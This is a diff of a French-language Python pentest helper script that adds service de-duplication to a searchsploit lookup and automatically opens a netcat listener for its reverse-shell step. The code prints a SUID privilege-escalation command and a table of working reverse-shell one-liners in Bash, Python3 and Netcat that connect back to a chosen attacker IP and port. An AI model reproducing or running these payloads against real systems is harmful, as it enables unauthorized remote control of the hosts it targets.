@@ -67,18 +67,27 @@ def scan_target(ip):
         except Exception as e: console.print(f"[bold red]Erreur Nmap : {e}[/bold red]")
     return results
 
-# --- ÉTAPE 2 : SEARCHSPLOIT INTELLIGENT ---
+# --- ÉTAPE 2 : SEARCHSPLOIT INTELLIGENT (ANTI-DOUBLONS) ---
 def run_searchsploit(open_ports):
     console.print("\n[bold yellow][*] Recherche d'Exploits (Smart Mode)...[/bold yellow]")
+    services_deja_vus = set() # Notre mémoire anti-doublons
+
     for p in open_ports:
         product = p['product'].split()[0] if p['product'] else p['service']
         version = p['version'].split()[0] if p['version'] else ""
         
-        # 1. Recherche Large (Toujours exécutée pour ne rien rater)
+        # Signature unique du service
+        signature = f"{product}_{version}"
+        if signature in services_deja_vus:
+            continue # Si on l'a déjà vu, on passe au suivant !
+        
+        services_deja_vus.add(signature) # On l'ajoute à la mémoire
+        
+        # 1. Recherche Large
         console.print(f"\n[bold blue]🔍 Test générique : {product}[/bold blue]")
         subprocess.run(["searchsploit", "--disable-colour", product])
         
-        # 2. Recherche Précise (Seulement si on a une version)
+        # 2. Recherche Précise
         if version:
             console.print(f"[bold magenta]🎯 Test précis : {product} {version}[/bold magenta]")
             subprocess.run(["searchsploit", "--disable-colour", product, version])
@@ -139,19 +148,30 @@ def run_suid_helper():
     console.print(Panel("[bold red]LANCE CETTE COMMANDE SUR LA CIBLE (SSH/Shell) :[/bold red]\n\n[green]find / -perm -u=s -type f 2>/dev/null[/green]", title="Escalade SUID"))
     console.print("[dim]Cette commande listera les fichiers qui peuvent te donner les droits ROOT (ex: /usr/bin/menu).[/dim]")
 
-# --- ÉTAPE 7 : REVERSE SHELLS ---
+# --- ÉTAPE 7 : REVERSE SHELLS (AVEC AUTO-LISTENER) ---
 def run_payload_generator():
     console.print("\n[bold red]☠️  USINE À REVERSE SHELLS ☠️[/bold red]")
     ip = questionary.text("Ton IP d'écoute (ex: tun0) :").ask()
     port = questionary.text("Ton port d'écoute :", default="4444").ask()
     
-    console.print(f"\n[dim]Dans un autre terminal : sudo nc -lvnp {port}[/dim]\n")
+    # === LA MAGIE : OUVERTURE DU TERMINAL AUTOMATIQUE ===
+    console.print(f"\n[bold yellow][*] Ouverture automatique du Listener sur le port {port}...[/bold yellow]")
+    try:
+        # Lance x-terminal-emulator (le terminal par défaut de Kali) avec la commande Netcat
+        cmd_listener = f"bash -c 'sudo nc -lvnp {port}; exec bash'"
+        subprocess.Popen(["x-terminal-emulator", "-e", cmd_listener])
+        console.print("[bold green][+] Fenêtre du Listener ouverte avec succès ![/bold green]\n")
+    except Exception as e:
+        console.print(f"[dim red]Échec de l'ouverture auto, lance : sudo nc -lvnp {port}[/dim red]\n")
+    # ====================================================
+
     table = Table(title=f"Payloads pour {ip}:{port}", show_lines=True)
     table.add_column("Type", style="magenta"); table.add_column("Commande", style="green")
     table.add_row("Bash", f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'")
     table.add_row("Python3", f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{int(port)}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'")
     table.add_row("Netcat", f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f")
     console.print(table)
+    
 
 # --- MENU PRINCIPAL (INTERACTIF) ---
 def interactive_menu(ip, open_ports):
